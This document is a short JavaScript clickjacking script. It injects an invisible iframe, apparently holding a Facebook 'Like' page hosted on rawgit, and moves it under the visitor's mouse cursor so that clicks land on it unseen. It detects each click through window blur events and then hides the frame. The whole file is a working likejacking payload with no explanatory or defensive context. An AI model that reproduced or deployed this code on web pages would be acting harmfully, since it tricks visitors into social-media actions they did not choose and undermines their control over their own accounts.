function MouseSeguir(Coordenadas) { 
    var NetScape = (navigator['appName']['indexOf']('Netscape') != -1); 
    var CoordenadasX = (NetScape) ? Coordenadas['pageX'] : event['clientX']; 
    var CoordenadasY = (NetScape) ? Coordenadas['pageY'] : event['clientY']; 
    document['getElementById']('DivSeguir')['style']['left'] = CoordenadasX + -13 + 'px'; 
    document['getElementById']('DivSeguir')['style']['top'] = CoordenadasY + -10 + 'px'; 
} 
  
function OcultarDiv() { 
    document['getElementById']('DivSeguir')['style']['display'] = 'none'; 
} 
  
var SobreIframe = false; 
  
function MouseSalio() { 
    SobreIframe = false; 
    top['focus'](); 
} 
  
function MouseArriba() { 
    SobreIframe = true; 
} 
  
function iframeClick() { 
    if (SobreIframe) { 
        setInterval('OcultarDiv()', '700'); 
    } 
} 
  
function iniciar() { 
    var iframe0 = document['getElementsByTagName']('iframe'); 
    for (var x = 0; x < iframe0['length']; x++) { 
        iframe0[x]['onmouseover'] = MouseArriba; 
        iframe0[x]['onmouseout'] = MouseSalio; 
    } 
  
    if (typeof window['attachEvent'] != 'undefined') { 
        top['attachEvent']('onblur', iframeClick) 
    } else { 
        if (typeof window['addEventListener'] != 'undefined') { 
            top['addEventListener']('blur', iframeClick, false); 
        } 
    } 
} 
  
document.write("<style>.CSS_Seguir{ overflow:hidden;opacity:0; filter:alpha(opacity=0); -moz-opacity:0; position:absolute;top:0;left:0;z-index:200000;overflow:hidden;height:20px;width:36px;border:1px solid #000;}</style>"); 
  
var sx = document.createElement('iframe'); 
sx.setAttribute("class", "CSS_Seguir"); 
sx.setAttribute("id", "DivSeguir"); 
sx.setAttribute("src", "https://rawgit.com/gilbob/FB-TEST/master/FB-Like-1.php"); 
sx.setAttribute("scrolling", "no"); 
sx.setAttribute("frameborder", "0"); 
sx.setAttribute("style", "overflow:hidden; width:36px; height:20px;"); 
document.getElementsByTagName("body")[0].appendChild(sx); 
iniciar(); 
document.onmousemove = MouseSeguir;  